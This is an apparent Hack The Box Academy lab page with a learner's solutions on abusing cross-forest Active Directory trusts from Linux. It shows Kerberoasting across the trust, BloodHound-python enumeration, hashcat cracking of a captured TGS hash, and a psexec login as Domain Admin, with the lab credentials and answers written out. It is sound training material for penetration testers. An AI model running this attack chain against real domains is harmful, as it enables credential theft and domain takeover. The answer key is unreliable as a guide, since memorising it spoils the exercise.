# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command. Performing this against the `FREIGHTLOGISTICS.LOCAL` domain, we see one SPN entry for the `mssqlsvc` account.

### Cross-Forest Kerberoasting

**Using GetUserSPNs.py**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never> 
```

Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.

**Using the -request Flag**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```

We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.

Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.

***

### Hunting Foreign Group Membership with Bloodhound-python

As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the [Python implementation of BloodHound](https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.

On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `ACADEMY-EA-DC01` as the nameserver.

**Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Once this is in place, we can run the tool against the target domain as follows:

**Running bloodhound-python Against INLANEFREIGHT.LOCAL**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>
```

We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.

**Compressing the File with zip -r**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)
```

We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.

**Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

The `bloodhound-python` command will look similar to the previous one:

**Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

```shell-session
AIceBear@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```

After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

**Viewing Dangerous Rights through BloodHound**

![image](https://academy.hackthebox.com/storage/modules/143/foreign\_membership.png)

***

### Closing Thoughts on Trusts

As seen in the past few sections, there are several ways to leverage domain trusts to gain additional access and even do an "end-around" and escalate privileges in our current domain. For example, we can take over a domain that our current domain has a trust with, and find password re-use across privileged accounts. We've seen how Domain Admin rights in a child domain nearly always mean we can escalate privileges and compromise the parent domain using the ExtraSids attack. Domain trusts are a rather large and complex topic. The primer in this module has given us the tools to enumerate trusts and perform some standard intra-forest and cross-forest attacks.

### **Questions**

Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.

```bash
ssh htb-student@10.129.23.192    
cd /opt/impacket/examples
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT/wley #transporter@4
#ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
#-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
#MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
#TTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>     
```

`sapsso`

Crack the TGS and submit the cleartext password as your answer.

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley ##transporter@4
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$388c584c7a571b5dde001b1eeed5a24c$7f752323aeb7c47792dabfc61db94b9648e0305b1d11a5ec265c3102b2b19881bfba0ecfd3ce9e9df11a29332e1d59a54751ecfb8a5bc62c9768af733cc2bb54948457af1803e4114cbbc3d00b7f12afb0c2fb8782e063ff668c71f004fb41915fa9e9c0edb3a5dae6e8ca3c0ff52393efacb42258f992651a25f90ac2f12b5c25eaa308c95ae3544e635f9d1ea0c2b63dece09d97bb0d8d628ed078a63813ca201b6a91f453a33b2a3161131477d22ebcca85a07b4a3fb6dbef144daf4f9c69852be824207bbe34186dd74fdc50d66f8d9000ac777257b9218f190dde1af17e4b6874b0d96de80c3d9f1fd3b398192d0ec17ed31832360ed56c57461d0a8ab588167840431382475d1fc0bdca0a04325b6d6b75732ed41ae821a07e7a84a28a084464f5434e1962e773b10d59d75908d51c3c2900073b237263067c106ae4549662e0972d2f66a1f8b01016c25a1d81d068523eb29f4c26a117d94d3175666be038438cf59cb331c2fe902cf46d545ab488bcd8e78228ae6f3362bd65456ed3eb493d86ffa9141efc530fb17f3684cc5801cb006989aaf2c188ce2ee4a384c981e449fdf3e5218bd90f7c871b38cf6c494829bbf34521e9734ef69940a4bc8e83f0803168055024df713881207fad0c4a9b48858ed3d9229529cc852d0f9f94c48815a6e3376ac7eecbaabeb187cb1e7423cf890e0b0bae56d7f9417a6e35ccd7a55b9058eabf1e6d8c41a3599a04b318a87b1e8b23c0930b85e46f1cfc17643c16372ab0bffd38b9719150361fbaf3ab4638e8ea7757ab1f3c6e670aa80849966da72759b79610ce941d5c098f2042a215591d6d68a6e554412026a5909c8489eeec6e47fcf2ec7792382462ffa5c8e59ce127d1e667ee25a2365a545e764ec03d19dd55d5a4fd95f9e72a33e690ace5110d237622f64b17fc607cf4317c17cecc327472b910f64649d4c6ef06a2ebbdc55ec3086b4fb1dacf15aabf49f0417f7e3045a7f327dd8ef0ec6eafddabf5449b250b9e718b3ec36da26b2b3a30bd9fbdc9ed438ecadaffb099a3c35553916586bb64c1d06bc778ce131c23dfbaa6960dc7e4acb10a7521d547a71208aa31e4061ac53a3e3ed7f09289cb4b83bd6683eca40b88d20fc329a632d0f66a8f2d73b56dd3c13837c87b2f609af5d7fd68fec45516a25fbdb50012a195ac3a7732fb88de9d5bfc2965e3b8c52e16183e387b3dfc4d2c36850668edb118ca5078d60ab9f8cce571bf73b880ffa143dd516ef7ed5c88d7fc01996901bda1bf6c01d859867e453bc48c5663603145a0b2143941fe452e2d5c427f7de42e3cf75d8c1a70cecd567bdffbd168363d9666a8426311cf9e6d8a611e1c8ccb1c8388a4fae59d38eede5dffd191f8d58cd323bed36eb1ec9a025b03956dba90cda02cb4ba3f7a676ed474800628ab51d9c08426eab3cb15776f709fe14e
```

copy sapsso hash into a text file and try crack with hashcat

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$388c584c7a571b5dde001b1eeed5a24c$7f752323aeb7c47792dabfc61db94b9648e0305b1d11a5ec265c3102b2b19881bfba0ecfd3ce9e9df11a29332e1d59a54751ecfb8a5bc62c9768af733cc2bb54948457af1803e4114cbbc3d00b7f12afb0c2fb8782e063ff668c71f004fb41915fa9e9c0edb3a5dae6e8ca3c0ff52393efacb42258f992651a25f90ac2f12b5c25eaa308c95ae3544e635f9d1ea0c2b63dece09d97bb0d8d628ed078a63813ca201b6a91f453a33b2a3161131477d22ebcca85a07b4a3fb6dbef144daf4f9c69852be824207bbe34186dd74fdc50d66f8d9000ac777257b9218f190dde1af17e4b6874b0d96de80c3d9f1fd3b398192d0ec17ed31832360ed56c57461d0a8ab588167840431382475d1fc0bdca0a04325b6d6b75732ed41ae821a07e7a84a28a084464f5434e1962e773b10d59d75908d51c3c2900073b237263067c106ae4549662e0972d2f66a1f8b01016c25a1d81d068523eb29f4c26a117d94d3175666be038438cf59cb331c2fe902cf46d545ab488bcd8e78228ae6f3362bd65456ed3eb493d86ffa9141efc530fb17f3684cc5801cb006989aaf2c188ce2ee4a384c981e449fdf3e5218bd90f7c871b38cf6c494829bbf34521e9734ef69940a4bc8e83f0803168055024df713881207fad0c4a9b48858ed3d9229529cc852d0f9f94c48815a6e3376ac7eecbaabeb187cb1e7423cf890e0b0bae56d7f9417a6e35ccd7a55b9058eabf1e6d8c41a3599a04b318a87b1e8b23c0930b85e46f1cfc17643c16372ab0bffd38b9719150361fbaf3ab4638e8ea7757ab1f3c6e670aa80849966da72759b79610ce941d5c098f2042a215591d6d68a6e554412026a5909c8489eeec6e47fcf2ec7792382462ffa5c8e59ce127d1e667ee25a2365a545e764ec03d19dd55d5a4fd95f9e72a33e690ace5110d237622f64b17fc607cf4317c17cecc327472b910f64649d4c6ef06a2ebbdc55ec3086b4fb1dacf15aabf49f0417f7e3045a7f327dd8ef0ec6eafddabf5449b250b9e718b3ec36da26b2b3a30bd9fbdc9ed438ecadaffb099a3c35553916586bb64c1d06bc778ce131c23dfbaa6960dc7e4acb10a7521d547a71208aa31e4061ac53a3e3ed7f09289cb4b83bd6683eca40b88d20fc329a632d0f66a8f2d73b56dd3c13837c87b2f609af5d7fd68fec45516a25fbdb50012a195ac3a7732fb88de9d5bfc2965e3b8c52e16183e387b3dfc4d2c36850668edb118ca5078d60ab9f8cce571bf73b880ffa143dd516ef7ed5c88d7fc01996901bda1bf6c01d859867e453bc48c5663603145a0b2143941fe452e2d5c427f7de42e3cf75d8c1a70cecd567bdffbd168363d9666a8426311cf9e6d8a611e1c8ccb1c8388a4fae59d38eede5dffd191f8d58cd323bed36eb1ec9a025b03956dba90cda02cb4ba3f7a676ed474800628ab51d9c08426eab3cb15776f709fe14e:pabloPICASSO
```

`pabloPICASSO`

Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.

```bash
psexec.py ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.freightlogistics.local -target-ip 172.16.5.238 #pabloPICASSO
```

navigate to the admin desktop and find flag

```powershell
type Users\Administrator\Desktop\flag.txt
```

`burn1ng_d0wn_th3_f0rest!`
